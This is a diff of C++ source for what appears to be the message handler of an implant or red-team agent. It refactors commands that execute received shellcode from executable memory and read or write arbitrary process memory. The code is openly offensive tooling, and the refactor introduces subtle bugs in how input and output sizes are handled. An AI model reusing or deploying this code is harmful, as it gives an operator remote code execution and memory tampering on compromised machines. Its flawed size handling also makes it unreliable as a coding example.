@@ -1,11 +1,149 @@
 #include "global.hpp"
 #include <stdint.h>
+#include <cstring>
+
+#define PROFILE
+
+#ifdef PROFILE_1
+#include <iostream>
+using namespace std;
+#endif
 #ifdef DEBUG
 #include <iostream>
 using namespace std;
 #endif
+
+using namespace std;
+
 typedef unsigned long long (*ShellcodeFunc)();
-size_t createHandshake(char* resp, size_t respMax, void* scratchpad);
+size_t createHandshake(char* resp, size_t respMax);
+
+bool handleHandshake(
+    char* output,
+    size_t outputCapacity,
+    size_t& outputSize
+) {
+    if (outputCapacity < 1) return false;
+
+    outputSize = createHandshake(output, outputCapacity);
+    return true;
+}
+
+bool handleExecuteShellcode(
+    const char* input,
+    size_t inputSize,
+    char* output,
+    size_t outputCapacity,
+    size_t& outputSize,
+    PVOID execution_mem
+) {
+#ifdef PROFILE_1
+    LARGE_INTEGER freq, start, end;
+    QueryPerformanceFrequency(&freq);
+    QueryPerformanceCounter(&start);
+#endif
+
+    // Format: [Type 0x01][8-byte size][Shellcode Bytes]
+    if (inputSize < 8) return false;
+
+    uint64_t sc_size = *(uint64_t*)(input);
+
+    if (inputSize < (8 + sc_size)) return false;
+
+    memcpy(execution_mem, input + 8, (size_t)sc_size);
+    ShellcodeFunc exec = (ShellcodeFunc)execution_mem;
+
+#ifdef DEBUG
+    cout << "Executing " << hex << (unsigned long long)execution_mem
+         << ". Size " << sc_size << endl;
+#endif
+
+    unsigned long long result = exec();
+
+    // Format response: [Type 0x01][8-byte result]
+    if (outputCapacity < 9) return false;
+    memcpy(output, &result, 8);
+    outputSize = 8;
+
+#ifdef PROFILE_1
+    QueryPerformanceCounter(&end);
+    double time = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
+    cout << "Time: " << time << " seconds (Execution)\n";
+#endif
+
+    return true;
+}
+
+void handleReadMemory(
+    const char* input,
+    size_t inputSize,
+    char* output,
+    size_t outputCapacity,
+    size_t& outputSize
+) {
+#ifdef PROFILE_1
+    LARGE_INTEGER freq, start, end;
+    QueryPerformanceFrequency(&freq);
+    QueryPerformanceCounter(&start);
+#endif
+
+    // Format: [Type 0x02][8-byte addr][8-byte len]
+    if (inputSize < 16) return;
+
+    uint64_t startAddr = *(uint64_t*)(input);
+    uint64_t readLen = *(uint64_t*)(input+8);
+
+    if (readLen > outputCapacity) {
+        readLen = outputCapacity;
+    }
+
+    #ifdef DEBUG
+        cout << "Reading from " << hex << (unsigned long long)startAddr
+            << ". Size " << readLen << endl;
+    #endif
+
+    memcpy(output, (void*)startAddr, (size_t)readLen);
+    outputSize = (size_t)readLen + 1;
+
+    #ifdef PROFILE_1
+        QueryPerformanceCounter(&end);
+        double time = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
+        cout << "Time: " << time << " seconds (Read)\n";
+    #endif
+
+}
+
+void handleWriteMemory(
+    const char* input,
+    size_t inputSize
+) {
+#ifdef PROFILE_1
+    LARGE_INTEGER freq, start, end;
+    QueryPerformanceFrequency(&freq);
+    QueryPerformanceCounter(&start);
+#endif
+
+    // Format: [Type 0x03][8-byte addr][8-byte len][Data...]
+    if (inputSize < 16) return;
+
+    uint64_t writeAddr = *(uint64_t*)(input);
+    uint64_t writeLen = *(uint64_t*)(input + 8);
+
+    if (inputSize < (16 + writeLen)) return;
+
+    #ifdef DEBUG
+        cout << "Writing to " << hex << (unsigned long long)writeAddr
+            << ". Size " << writeLen << endl;
+    #endif
+
+    memcpy((void*)writeAddr, input + 16, (size_t)writeLen);
+
+    #ifdef PROFILE_1
+        QueryPerformanceCounter(&end);
+        double time = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
+        cout << "Time: " << time << " seconds (Write)\n";
+    #endif
+}
 
 bool handleMessage(
     const char* input,
@@ -21,80 +159,40 @@ bool handleMessage(
     }
 
     uint8_t type = (uint8_t)input[0];
-    outputSize = 0; // Initialize size
+    outputSize = 0;
 
     switch (type) {
-        case 0x00: { // Handshake
-            output[0] = 0x00 ; // Success indicator
-            outputSize = createHandshake(output+1, outputCapacity-1, scratchpad)+1;
-            return true;
-        }
+        case 0x00:
+            if(handleHandshake(output+1, outputCapacity-1, outputSize)){
+                output[0] = 0;
+                outputSize++;
+            }
+            else{
+                output[0] = 0;
+                outputSize = 1;
+            }
+            break;
 
-        case 0x01: { // Execute Shellcode
-            // Format: [Type 0x01][8-byte size][Shellcode Bytes]
-            if (inputSize < 9) return false;
-            uint64_t sc_size = *(uint64_t*)(input + 1);
-            
-            if (inputSize < (9 + sc_size)) return false;
+        case 0x01:
+            handleExecuteShellcode(input+1,inputSize, output+1, outputCapacity-1, outputSize, execution_mem);
+            output[0] = 1;
+            outputSize++;
+            break;
 
-            // Copy and Execute (Assumes 'execution_mem' is pre-allocated with RWX)
-            memcpy(execution_mem, input + 9, (size_t)sc_size);
-            ShellcodeFunc exec = (ShellcodeFunc)execution_mem;
-            #ifdef DEBUG
-            cout << "Executing " << (hex) << (unsigned long long) execution_mem << ". Size " << sc_size << endl;
-            #endif
-            uint64_t result = exec();
+        case 0x02:
+            handleReadMemory(input+1,inputSize, output+1, outputCapacity-1, outputSize);
+            output[0] = 1;
+            outputSize++;
+            break;
 
-            // Format response: [Type 0x01][8-byte result]
-            if (outputCapacity < 9) return false;
-            output[0] = 0x01;
-            memcpy(output + 1, &result, 8);
-            outputSize = 9;
-            return true;
-        }
-
-        case 0x02: { // Read Memory
-            // Format: [Type 0x02][8-byte addr][8-byte len]
-            if (inputSize < 17) return false;
-            uint64_t startAddr = *(uint64_t*)(input + 1);
-            uint64_t readLen = *(uint64_t*)(input + 9);
-
-            // Bounds Check
-            if (readLen + 1 > outputCapacity) readLen = outputCapacity - 1;
-
-            output[0] = 0x01; // Success indicator
-            // Caution: Arbitrary read can cause access violation (0xC0000005)
-            // Use IsBadReadPtr or __try/__except in real assessments
-            #ifdef DEBUG
-            cout << "Reading from " << (hex) << (unsigned long long) startAddr << ". Size " << readLen << endl;
-            #endif 
-            memcpy(output + 1, (void*)startAddr, (size_t)readLen);
-            outputSize = (size_t)readLen + 1;
-            return true;
-        }
-
-        case 0x03: { // Write Memory
-            // Format: [Type 0x03][8-byte addr][8-byte len][Data...]
-            if (inputSize < 17) return false;
-            uint64_t writeAddr = *(uint64_t*)(input + 1);
-            uint64_t writeLen = *(uint64_t*)(input + 9);
-
-            if (inputSize < (17 + writeLen)) return false;
-            #ifdef DEBUG
-            cout << "Writing to " << (hex) << (unsigned long long) writeAddr << ". Size " << writeLen << endl;
-            #endif
-            // Perform the write
-            memcpy((void*)writeAddr, input + 17, (size_t)writeLen);
-
-            if (outputCapacity < 1) return false;
-            output[0] = 0x01; // Success
-            outputSize = 1;
-            return true;
-        }
+        case 0x03:
+            handleWriteMemory(input+1,inputSize);
+            output[0] = 1;
+            outputSize++;
+            break;
 
         default:
-            break;
+            return false;
     }
-
-    return false; // Unknown type or error
+    return true;
 }
